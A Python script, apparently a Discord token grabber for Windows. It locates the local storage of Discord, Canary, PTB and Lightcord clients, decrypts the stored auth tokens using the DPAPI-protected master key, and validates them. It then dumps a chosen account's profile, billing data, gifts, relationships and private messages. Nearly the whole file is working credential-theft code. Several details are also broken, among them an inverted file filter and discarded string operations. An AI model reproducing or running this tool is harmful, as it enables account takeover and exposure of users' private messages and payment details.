import requests,json,os,colorama,datetime
from json import loads
from os import getlogin, listdir
from json import loads
from re import findall
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from time import sleep
from colorama import Fore, init
from DiscordClass import Discord
from dumps import *
colorama.init()


#Decypting the token
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"


#Paths to where the tokens are stored locally
paths = {
        'Discord': os.getenv('APPDATA') + '\\discord',
        'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
        'Lightcord': os.getenv('APPDATA') + '\\Lightcord',
        'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
    }


Tokens = []
def main():
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue

        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                if values.endswith("\\"):
                                    values.replace("\\", "")

                                values = decrypt(b64decode(values.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])

                                if values not in Tokens:
                                    Tokens.append(values)

                except PermissionError: continue


    if len(Tokens) == 0:
        print(Fore.RED+"No tokens found")
        sleep(3)
        return
    
    for num in range(len(Tokens)):
        Account = Discord(Tokens[num])
        if Account.is_valid():
            print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}{num}{Fore.WHITE}] {Account.get_username()}#{Account.get_discriminator()}")
        else:
            print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}{num}{Fore.WHITE}] Invalid Token Found!")

    Account_Index = int(input(f"{Fore.WHITE}Select an account:{Fore.LIGHTBLUE_EX} "))

    try:
        os.mkdir(f"{Account.get_username()}_{datetime.date.today()}")
    except:
        print(f"{Fore.RED}Folder already exists")

    os.system('cls')

    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}1{Fore.WHITE}] Account Info")
    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}2{Fore.WHITE}] Billing Info")
    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}3{Fore.WHITE}] Gift Inventory")
    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}4{Fore.WHITE}] Relationships")
    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}5{Fore.WHITE}] Private Messages")
    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}6{Fore.WHITE}] Full Dump")

    
    Option = int(input(f"{Fore.WHITE}Select an option:{Fore.LIGHTBLUE_EX} "))

    if Option == 1:
        AccountInfomation(Tokens[Account_Index])
    elif Option == 2:
        AccountBilling(Tokens[Account_Index])
    elif Option == 3:
        AccountGifts(Tokens[Account_Index])
    elif Option == 4:
        AccountRelationships(Tokens[Account_Index])
    elif Option == 5:
        AccountMessages(Tokens[Account_Index])
    elif Option == 6:
        AccountInfomation(Tokens[Account_Index])
        AccountBilling(Tokens[Account_Index])
        AccountGifts(Tokens[Account_Index])
        AccountRelationships(Tokens[Account_Index])
        AccountMessages(Tokens[Account_Index])
    else:
        print(f"{Fore.RED}Invalid Option")
        sleep(3)
        return
        
        




if __name__ == '__main__':
    main()